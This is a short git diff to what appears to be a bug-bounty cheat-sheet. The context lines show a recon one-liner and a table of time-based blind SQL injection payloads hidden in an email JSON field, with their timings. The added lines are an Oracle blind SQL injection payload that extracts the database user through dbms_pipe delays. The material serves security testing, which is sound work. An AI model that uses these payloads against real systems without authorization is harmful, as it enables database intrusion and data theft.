@@ -427,7 +427,10 @@ echo "bugcrowd.com" | subfinder -silent | hakrawler -plain -usewayback -scope yo
 |{“email”:”\”a’-IF(LENGTH(database())=10,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	Delay: 8,696 milis|
 |{“email”:”\”a’-IF(LENGTH(database())=11,SLEEP(7),0)or’1’=’1\”@a.com”}|	{“code”:0,”status”:200,”message”:”Successful”}|	Valid	No delay|
 
-
+### Oracle
+```
+1) UNION SELECT CASE WHEN (SELECT ASCII(SUBSTR((SELECT user FROM dual), 1, 1 )) FROM dual) >71 THEN (dbms_pipe.receive_message(('a'),10)) ELSE NULL END FROM dual --
+```
 
 
 ### Cool BurpPlugins
